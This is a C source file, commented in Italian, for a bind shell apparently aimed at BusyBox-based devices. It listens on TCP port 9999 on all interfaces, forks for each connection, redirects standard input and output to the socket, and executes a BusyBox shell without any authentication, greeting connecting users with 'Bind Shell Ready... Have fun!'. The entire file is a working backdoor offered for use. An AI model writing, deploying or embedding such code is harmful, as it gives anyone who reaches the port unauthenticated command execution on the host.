#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <arpa/inet.h>

#define SERVER_PORT 9999

int main(void) {
    int serverfd, clientfd;
    struct sockaddr_in serv_addr, cli_addr;
    socklen_t cli_len = sizeof(cli_addr);
    pid_t pid;

    // Ignora i figli zombie
    signal(SIGCHLD, SIG_IGN);

    // Crea socket
    serverfd = socket(AF_INET, SOCK_STREAM, 0);
    if (serverfd < 0) return 1;

    int opt = 1;
    setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(SERVER_PORT);

    if (bind(serverfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        return 1;

    if (listen(serverfd, 5) < 0)
        return 1;

    char *banner = "[+] Bind Shell Ready on port 9999 - Have fun!\n$ ";
    char *shell[] = { "/bin/busybox", "sh", NULL };

    while (1) {
        clientfd = accept(serverfd, (struct sockaddr *)&cli_addr, &cli_len);
        if (clientfd < 0) continue;

        pid = fork();

        if (pid < 0) {
            close(clientfd);
            continue;
        }

        if (pid == 0) {  // Processo figlio
            close(serverfd);  // il figlio non ha bisogno del listening socket

            // Invia banner
            write(clientfd, banner, strlen(banner));

            // Redirigi stdin/stdout/stderr verso il socket
            dup2(clientfd, 0);
            dup2(clientfd, 1);
            dup2(clientfd, 2);
            close(clientfd);  // non più necessario tenerlo aperto

            // Esegui la shell corretta per BusyBox
            execve("/bin/busybox", shell, NULL);

            // Se fallisce
            write(clientfd, "execve failed\n", 14);
            exit(1);
        }

        // Processo padre
        close(clientfd);
    }

    close(serverfd);
    return 0;
}